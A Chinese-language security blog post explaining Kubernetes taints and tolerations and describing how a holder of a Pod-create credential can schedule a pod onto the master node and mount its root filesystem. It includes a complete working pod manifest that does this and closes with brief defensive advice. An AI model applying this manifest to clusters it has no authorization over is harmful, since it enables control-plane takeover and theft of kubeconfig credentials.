---
title: K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master
date: 2025-04-01 11:00:00
categories:
  - Cloud Security
tags:
  - Kubernetes
  - 容器安全
  - 横向移动
  - 特权逃逸
---

K8s 集群默认给 Master 节点打了 `NoSchedule` 污点，普通 Pod 不会调度上去。但如果拿到了一个带 `Create` 权限的凭据，可以通过**污点容忍**把 Pod 强行调度到 Master，再挂载宿主机根目录完成逃逸。本文整理一下这条攻击路径的完整链条。

## 1. 背景：污点与容忍

**污点 (Taints)** —— 打在节点上，阻止 Pod 调度。

**容忍 (Tolerations)** —— 打在 Pod 上，"我不怕这个污点"，强行往上调度。

### 1.1 污点的三种效果

| 效果 | 含义 |
|------|------|
| `NoSchedule` | Pod 不会被调度到该节点 |
| `PreferNoSchedule` | 尽量不调度到该节点（软限制） |
| `NoExecute` | 不调度，且驱逐节点上已有 Pod |

查看节点污点：

```bash
kubectl describe node <nodename>
```

### 1.2 为什么 Master 需要污点

Master 节点运行着 `kube-apiserver` 等控制面组件，是整个集群的核心。默认情况下 Master 会被标记污点，避免业务 Pod 抢占资源或造成安全风险。

### 1.3 容忍的匹配规则

容忍度定义在 Pod 的 `spec.tolerations` 中，支持两种匹配方式：

- **Equal** — `key`、`value`、`effect` 三者完全匹配
- **Exists** — `key` 和 `effect` 匹配即可，`value` 留空

## 2. 调度器是如何工作的

`kube-scheduler` 是 Master 上的默认调度器，它的工作流程：

1. API Server 收到创建 Pod 请求，数据写入 etcd
2. Scheduler 通过 list-watch 监听到新 Pod
3. 经过调度算法（过滤 + 打分）选出最优 Node
4. 结果写回 etcd，对应节点的 kubelet 负责创建容器

![](https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114215942-1818140185.png)

### 2.1 影响调度的主要因素

**资源限制**：调度器检查每个节点的 CPU / Memory 是否满足 Pod 需求。

**nodeSelector**：最简单的方式，Pod 只调度到带有指定 label 的节点。

**nodeAffinity**：`nodeSelector` 的升级版，支持逻辑组合，更灵活。

## 3. 攻击：从 Worker 横向到 Master

### 3.1 思路

1. 拿到一个具有 Pod Create 权限的凭据（通常通过创建特权容器逃逸到某台 Worker 节点）
2. 默认 Pod 不允许调度到 Master（因为 `NoSchedule` 污点）
3. 在 Pod 定义中添加 `tolerations`，匹配 Master 的污点标签
4. Pod 被调度到 Master 后，挂载宿主机根目录，完成逃逸

### 3.2 Master 的默认污点

```bash
kubectl describe node master-node
# Taints: node-role.kubernetes.io/master:NoSchedule
```

![](https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114242342-1939908142.png)

### 3.3 构造带容忍度的 Pod

关键就在 `spec.tolerations` 这段——声明"我能容忍 `node-role.kubernetes.io/master` 的 `NoSchedule` 污点"：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: masterpwn1
  namespace: cloud-prod
spec:
  tolerations:
  - key: "node-role.kubernetes.io/master"
    operator: "Exists"
    effect: "NoSchedule"
  volumes:
  - name: pwnmaster-vol
    hostPath:
      path: /
  containers:
  - name: nginx
    image: nginx
    imagePullPolicy: IfNotPresent
    volumeMounts:
    - name: pwnmaster-vol
      mountPath: /mnt
    ports:
    - containerPort: 8080
  serviceAccountName: cloud-account
```

### 3.4 效果

部署后 Pod 成功落在 Master 节点：

![](https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114256903-1174883148.png)

由于挂载了 Master 宿主机根目录 `/` 到容器内的 `/mnt`，可以任意读写 Master 节点的文件系统：

![](https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114310017-298119589.png)

直接读取 kubeconfig 配置文件：

![](https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114322656-206406249.png)

## 4. 总结

这条链路的核心就两点：

- Master 节点的 `NoSchedule` 污点可以通过 Pod 的 `tolerations` 绕过
- 一旦 Pod 落在 Master，配合 `hostPath` 挂载根目录就能拿到 Master 的控制权

防御侧可以考虑：限制 `tolerations` 的使用（准入控制器）、禁止挂载宿主机敏感路径、限制 Pod 的 `serviceAccount` 权限。
